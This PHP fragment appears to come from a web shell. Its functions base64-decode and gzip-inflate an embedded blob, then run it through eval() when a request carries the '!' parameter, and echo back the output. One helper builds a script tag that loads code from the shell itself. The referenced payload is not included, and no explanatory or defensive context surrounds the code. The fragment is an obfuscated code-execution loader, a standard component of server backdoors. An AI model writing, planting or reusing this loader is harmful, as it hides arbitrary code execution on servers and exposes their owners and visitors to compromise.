<?php
function get_code($t, $c){
	global $s_self;
	$c = gzinflate(base64_decode($c));
	
	if($t=="js"){
		return "<script type='text/javascript' src='".$s_self."!'></script>";
	}
}

function showcode($raw){
	$c = gzinflate(base64_decode($raw));
	ob_get_contents();
	ob_end_clean();
	ob_start();
	eval("?>".$c);
	$s_res = ob_get_contents();
	ob_end_clean();
	echo $s_res;
	die();	
}

global $s_self;
$s_self = "?";

if(isset($_GET['!'])) 
    showcode($s_js);

exit;
?>